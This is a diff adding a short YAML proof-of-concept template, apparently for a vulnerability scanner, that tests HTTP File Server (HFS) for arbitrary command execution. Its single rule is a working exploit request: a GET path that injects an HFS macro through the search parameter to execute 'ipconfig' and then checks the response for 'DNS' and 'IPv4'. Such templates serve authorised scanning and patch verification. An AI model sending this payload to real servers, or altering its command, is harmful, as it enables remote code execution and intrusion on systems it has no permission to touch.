@@ -1,0 +1,13 @@
+name: poc-yaml-HFS-cmd
+description: >-
+  任意命令执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/?n=%0A&cmd=ipconfig+&search=%25x%25url%25:%user%}{.exec|{.?cmd.}|timeout=15|out=output.}{.?n.}{.?n.}RESULT:{.?n.}^====^{.?n.}{.^output.}^====^{.?n.}"
+    expression:
+      status: 200
+      body_all:
+        - "DNS"
+        - "IPv4"
